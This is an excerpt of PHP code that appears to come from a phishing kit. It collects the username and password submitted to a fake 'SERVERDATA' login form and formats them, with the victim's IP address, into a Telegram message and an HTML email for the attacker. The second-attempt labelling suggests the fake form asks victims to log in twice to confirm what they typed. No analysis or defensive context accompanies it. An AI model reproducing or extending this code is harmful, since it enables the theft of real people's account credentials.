...
$required = array('fldUsernamei', 'fldPasswordi');
...
$msgtg = "🔐 <b>SERVERDATA LOGIN DETAILS (ATTEMPT 2)</b> 🔐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

$msgtg .= "👤 <b>LOGIN INFO</b>\n";
$msgtg .= "• Login ID: <code>" . htmlspecialchars($_POST['fldUsernamei']) . "</code>\n";
$msgtg .= "• Password: <code>" . htmlspecialchars($_POST['fldPasswordi']) . "</code>\n\n";
...
<body>
    <div class='container'>
        <div class='header'>
            <h2>✦ SERVERDATA Login Details (Attempt 2) ✦</h2>
        </div>
        <div class='section'>
            <h3>🔥 Login Information</h3>
            <p>Login ID: <code>" . htmlspecialchars($_POST['fldUsernamei']) . "</code></p>
            <p>Password: <code>" . htmlspecialchars($_POST['fldPasswordi']) . "</code></p>
        </div>
        <div class='section'>
...
if ($settings['send_mail'] == "1"){
    ...
    $subject = "✦ SERVERDATA Login (Attempt 2) - {$IP} ✦";
